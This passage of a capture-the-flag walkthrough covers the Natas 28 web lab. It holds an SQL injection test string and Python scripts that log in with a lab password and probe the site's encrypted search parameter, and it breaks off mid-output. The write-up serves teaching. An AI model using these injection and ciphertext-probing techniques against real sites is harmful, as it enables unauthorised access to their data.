@@ -4292,4 +4292,634 @@ URL: http://natas28.natas.labs.overthewire.org
 
 ### Message
 
+> Whack Computer Joke Database
+
+There is a **Search** field.
+
+Under it there is the message:
+
+> sorry, we are currently out of sauce
+
 ### Solution
+
+Input the string `asd` in the search and get:
+
+> Two strings walk into a bar and sit down. The bartender says, "So what'll it be?"
+> The first string says, "I think I'll have a beer quag fulk boorg jdk`^Xbasdh dsa 23^@!8
+> "Please excuse my friend," the second string says. "He isn't null-terminated."
+
+Input `asd' or 1=1 --` and get a blank page.
+
+The URL is:
+
+```
+http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLei%2B6aGQjSnxLGTCg1BXadJoN0j36x2764CKTMbTEKFadz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
+```
+
+This is interesting...
+
+Remove a letter from the part following `query=` in the URL:
+
+```
+http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKg9sQ0V8wVl%2FPPsvF1L%2Fzemi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+```
+
+becomes
+
+```
+natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0QpdcjPKg9sQ0V8wVl%2FPPsvF1L%2Fzemi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+```
+
+This gives the error:
+
+> Notice: Trying to access array offset on value of type bool in **/var/www/natas/natas28/search.php** on line 59
+> Zero padding found instead of PKCS#7 padding
+
+Googling this error: it seems to be connected with some cryptographic issue.
+
+Try to script:
+
+A first script just to get a response from a request with query `asd`:
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+
+def send_request(session, query) -> str:
+    body = {"query": query}
+    response = session.post(url,
+                    headers=headers,
+                    data=body)
+    return response.text
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.auth = basic_auth
+    query = "asd"
+    print(send_request(session, query))
+```
+
+We can print the `query` parameter:
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+
+def send_request(session, query) -> str:
+    body = {"query": query}
+    response = session.post(url,
+                    headers=headers,
+                    data=body)
+    return response.url.split("=")[1]
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.auth = basic_auth
+    query = "asd"
+    print(send_request(session, query))
+```
+
+and get:
+
+```
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKg9sQ0V8wVl%2FPPsvF1L%2Fzemi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
+```
+
+This is URL-encoded...
+
+```python
+import requests
+import urllib
+from requests.auth import HTTPBasicAuth
+
+
+basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+
+def send_request(session, query) -> str:
+    body = {"query": query}
+    response = session.post(url,
+                    headers=headers,
+                    data=body)
+    result = response.url.split("=")[1]
+    return urllib.parse.unquote(result)
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.auth = basic_auth
+    query = "asd"
+    print(send_request(session, query))
+```
+
+Iterate over the length of the query:
+
+```python
+import requests
+import urllib
+from requests.auth import HTTPBasicAuth
+
+
+basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+
+def send_request(session, query) -> str:
+    body = {"query": query}
+    response = session.post(url,
+                    headers=headers,
+                    data=body)
+    result = response.url.split("=")[1]
+    return urllib.parse.unquote(result)
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.auth = basic_auth
+    query = ""
+    for i in range(32):
+        query += "a"
+        print(send_request(session, query))
+```
+
+This gives:
+
+```
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI1BKmpZ1/9YUtPH5DShPyqKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLDah8EaRWKMFIWYUal4/LsrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJKEf/nOv0V2qBes8NIbc3hQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKf3hzvbj+EoXJjPzB0/I4YZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJFPgAgYC9NzNUPDrdwlHfCiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKeYiaGpSZAWVcGCZq8sFK7oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK+3BthQLni68qM9OYQkTq645oGdhkgSlo=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWu8qmX2iNj9yo/rTMtFzb6dz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeiSUVjPxawG0iv9oLcsjxUad+jtGqvgtdBcT/5qwUI6tHjrGh/iYaLGwVBhEJs/7a
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OerfihrQF37R7K06x8EIKqnr36EFTsaFFc+W8qVURZGUeQT0sqvywtdoaqcqUxUclw
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeU9lJnrytaGHwS3zcJPMEYkh5mgex0ptZggFck1XC4A6t7ZvbrKanO3GzWgENLExX
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OepUn9pSttm04mMtsxg4hW1ZouK1228x8ZoU91Z46tqpBCSbk+TeoJCUeZlbnESzUa
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeIBG75Ijd4bvslhthcLMOEikofzzFR54S5m8xyGOxgEdW1XMtyMdw9kOXFYvBem5m
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeiCmh+TDOtWa4NEQcBXdALKw7hxwcRIOGtFzTbZ6PcvRlUUm7uiEj2J2VQX6ifzp7
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeVHYCtS+uFWasjpcfkfbWBUHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OepFqT7keU0bYgT7CSC2jyfWSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7aEY+Zn5SV6PPZc/umUoo4lt6QiE+GEIsWf4tK6l12ORcjIFFIPmjkWP0GYWezCj
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe8pCcTVN4HuF3egErsaclQaCVIvMBz502rHAj8WWUjFqXOc2QUi+nqG+VdztW+fjA
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo3OKX/tKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7TtoIfTwL6ivtwbYUC54uvKjPTmEJE6uuOaBnYZIEpa
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo86CqVU7ZbgSgPttO/KQD0d1/VBE/QY9Jva7f3NLQciZ
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqox90cU12/MXUZMaiIebtmORiI6FNnEKRuYd1sD+8c9Tt2K5R19pxsrCD2Rmg17iLmA==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo+zTb4/ZFk1ANUDkSXB9J+VCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4/emDU2A==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo1rvKpl9ojY/cqP60zLRc2+nc/MYUJSqAUCPH5fQN9OFZ4xXc+zCj4cOT068bIBwpA==
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo4klFYz8WsBtIr/aC3LI8VGnfo7Rqr4LXQXE/+asFCOrR46xof4mGixsFQYRCbP+2g==
+```
+
+The start `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP` is common.
+
+Now try with a query of a single letter varying:
+
+```python
+import requests
+import urllib
+import string
+
+
+basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+letters = string.ascii_letters
+
+def send_request(session, query) -> str:
+    body = {"query": query}
+    response = session.post(url,
+                    headers=headers,
+                    data=body)
+    result = response.url.split("=")[1]
+    return urllib.parse.unquote(result)
+
+if __name__ == '__main__':
+    session = requests.Session()
+    session.auth = basic_auth
+    query = ""
+    for letter in letters:
+        print(send_request(session, letter))
+```
+
+The result is interesting:
+
+```
+python natas29.py
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIYiwNnSJY7KHJGU+XjuMzVvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKEMZKNASy09t5ooTNAbaX0vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKnMw6aSOWjayIcOCUAu7bVvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIeoxGWFgXHXykQlH86OpiMvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKX9Nbu3XXL5PIaYqiW14GSvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLV4wF7G0i3DftMhPsAyZVqvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIJJW40OKGV9h7fJBqf28f9vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLMEPlGOfuQ7a1fFtCB5a1XvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPICgQ0oynl6FWbVHY/8dJkIvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLnuAD+NGYcU1yTMgoFGDHHvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIskS5tRSHzosjTBciCi/8VvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJTwbPiFdKuTtoify+YlBFLvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKvKlZ1HHFG9tUyBWOMONORvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIPdJbPB4AWVinSFPLRB1eYvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKD30n5dTLLZ3c/Rs9/bQwwvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKghh12LRBJ55334nG5LgfxvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKef8vfXgzqiOnKBXb2kd2cvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI+jVOKpzBAHVGo0XIzCijxvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKLbhtgC4p7C+91shiGBL15vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIRwoUdFyCT68E7RwSyaxRSvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIae8xMT+8hwEi33FOpyUlmvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKlwoXvDTqKtYfcUSRUbdOSvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJXwBmXBeBRhwrvq1HTCwh/vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPL7EnsTc1X3234z1DMqyjsMvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJDB5EyzqNqQNuIYdASJqV6vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJjS9S3adXJc/WWvI3XdcvzvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIV6guc0zYmhS2FK2WeDX9XvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJPZL/HuhXFCvKgIB2/Zln5vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJibK/FTJvyvXqxFb51bhV1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJhFsli4K/fPeKT4M8Ry23kvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKOKpwR3/gkTIMH8U7dhu4GvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKIDMQGG2abZtjOsSZs1X39vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKOvt9wFI9mjTVoT/tGtl7FvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPL5KLXni7y8eqJFwXWh1DUnvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPITdJXBsJQLwvXAvasuKjoevfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI2LEeQPtPKos7Cg24MI6rXvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIFr55FtnKO9tEyQa/+96tovfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKQYCy/DcTbyaMyrOKXW+nmvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJXWuUtLaAhQY1GD/2pLpWBvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJslle8BYSivKdpv1B2Y01FvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJaGM8iPTFRQd0Zmcxed5mevfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJiDv3VFbwCsAwUlLNbD2BFvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ3Nmyh1ZS++nAIX1FELIkMvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJO9/z7rq/TbEgCDg6ebTA6vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJs9IckNOkzgew37TadMpVqvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJHdksLJFuUJ3MlCTPRoS7rvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLxGu5bRS4vnVo0bm1VgVobvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI3GgIRwkWmfdd+oEfVBISnvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK6wkS+fLmU8WdWdeOrvNlhvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLPP49oqlQoQMK4BitKnvvEvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+```
+
+There is a common ending part: `vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=` (and there remains the common starting part `G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP`).
+
+We can study a little bit better the results of our queries with the following script:
+```python
+import requests
+import urllib
+import string
+
+from utils import utils
+
+
+basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+letters = string.ascii_letters
+
+def send_request(session, query) -> str:
+    body = {"query": query}
+    response = session.post(url,
+                    headers=headers,
+                    data=body)
+    result = response.url.split("=")[1]
+    return urllib.parse.unquote(result)
+
+if __name__ == '__main__':
+    letter_to_responses = {}
+    session = requests.Session()
+    session.auth = basic_auth
+    query = ""
+    for letter in letters:
+        letter_to_responses[letter] = send_request(session, letter)
+    responses = list(letter_to_responses.values())
+    prefix = utils.common_prefix_list(responses)
+    suffix = utils.common_suffix_list(responses)
+    print(f"Common prefix: {prefix}")
+    print(f"Common suffix: {suffix}")
+    different_parts = {k: s[len(prefix):len(s) - len(suffix)] for k, s in letter_to_responses.items()}
+    for k, s in different_parts.items():
+        print(f"{k}: {s}")
+```
+
+The output:
+```
+Common prefix: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
+Common suffix: vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+a: KriAqPE2++uYlniRMkobB1
+b: IYiwNnSJY7KHJGU+XjuMzV
+c: KEMZKNASy09t5ooTNAbaX0
+d: KnMw6aSOWjayIcOCUAu7bV
+e: IeoxGWFgXHXykQlH86OpiM
+f: KX9Nbu3XXL5PIaYqiW14GS
+g: LV4wF7G0i3DftMhPsAyZVq
+h: IJJW40OKGV9h7fJBqf28f9
+i: LMEPlGOfuQ7a1fFtCB5a1X
+j: ICgQ0oynl6FWbVHY/8dJkI
+k: LnuAD+NGYcU1yTMgoFGDHH
+l: IskS5tRSHzosjTBciCi/8V
+m: JTwbPiFdKuTtoify+YlBFL
+n: KvKlZ1HHFG9tUyBWOMONOR
+o: IPdJbPB4AWVinSFPLRB1eY
+p: KD30n5dTLLZ3c/Rs9/bQww
+q: Kghh12LRBJ55334nG5Lgfx
+r: Kef8vfXgzqiOnKBXb2kd2c
+s: I+jVOKpzBAHVGo0XIzCijx
+t: KLbhtgC4p7C+91shiGBL15
+u: IRwoUdFyCT68E7RwSyaxRS
+v: Iae8xMT+8hwEi33FOpyUlm
+w: KlwoXvDTqKtYfcUSRUbdOS
+x: JXwBmXBeBRhwrvq1HTCwh/
+y: L7EnsTc1X3234z1DMqyjsM
+z: JDB5EyzqNqQNuIYdASJqV6
+A: Kjd8MKDZZIiKG51FNeoPjU
+B: JjS9S3adXJc/WWvI3Xdcvz
+C: IV6guc0zYmhS2FK2WeDX9X
+D: JPZL/HuhXFCvKgIB2/Zln5
+E: JibK/FTJvyvXqxFb51bhV1
+F: JhFsli4K/fPeKT4M8Ry23k
+G: KOKpwR3/gkTIMH8U7dhu4G
+H: KIDMQGG2abZtjOsSZs1X39
+I: KOvt9wFI9mjTVoT/tGtl7F
+J: L5KLXni7y8eqJFwXWh1DUn
+K: ITdJXBsJQLwvXAvasuKjoe
+L: I2LEeQPtPKos7Cg24MI6rX
+M: IFr55FtnKO9tEyQa/+96to
+N: KQYCy/DcTbyaMyrOKXW+nm
+O: JXWuUtLaAhQY1GD/2pLpWB
+P: Jslle8BYSivKdpv1B2Y01F
+Q: JaGM8iPTFRQd0Zmcxed5me
+R: JiDv3VFbwCsAwUlLNbD2BF
+S: J3Nmyh1ZS++nAIX1FELIkM
+T: JO9/z7rq/TbEgCDg6ebTA6
+U: Js9IckNOkzgew37TadMpVq
+V: JHdksLJFuUJ3MlCTPRoS7r
+W: LxGu5bRS4vnVo0bm1VgVob
+X: I3GgIRwkWmfdd+oEfVBISn
+Y: K6wkS+fLmU8WdWdeOrvNlh
+Z: LPP49oqlQoQMK4BitKnvvE
+```
+
+Try now varying the length of the query:
+```python
+import requests
+import urllib
+import string
+
+from utils import utils
+
+
+basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+letters = string.ascii_letters
+
+def send_request(session, query) -> str:
+    body = {"query": query}
+    response = session.post(url,
+                    headers=headers,
+                    data=body)
+    result = response.url.split("=")[1]
+    return urllib.parse.unquote(result)
+
+if __name__ == '__main__':
+    letter_to_responses = {}
+    session = requests.Session()
+    session.auth = basic_auth
+    query = ""
+    for i in range(40):
+        query = "a" * i
+        letter_to_responses[query] = send_request(session, query)
+    responses = list(letter_to_responses.values())
+    prefix = utils.common_prefix_list(responses)
+    suffix = utils.common_suffix_list(responses)
+    print(f"Common prefix: {prefix}")
+    print(f"Common suffix: {suffix}")
+    different_parts = {k: s[len(prefix):len(s) - len(suffix)] for k, s in letter_to_responses.items()}
+    for k, s in different_parts.items():
+        print(f"{s}")
+```
+
+The output:
+```
+Common prefix: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
+Common suffix:
+Lof/YMma1yzL2UfjQXqQEop36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
+KriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+KxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
+IvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
+I1BKmpZ1/9YUtPH5DShPyqKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
+LDah8EaRWKMFIWYUal4/LsrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
+JKEf/nOv0V2qBes8NIbc3hQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
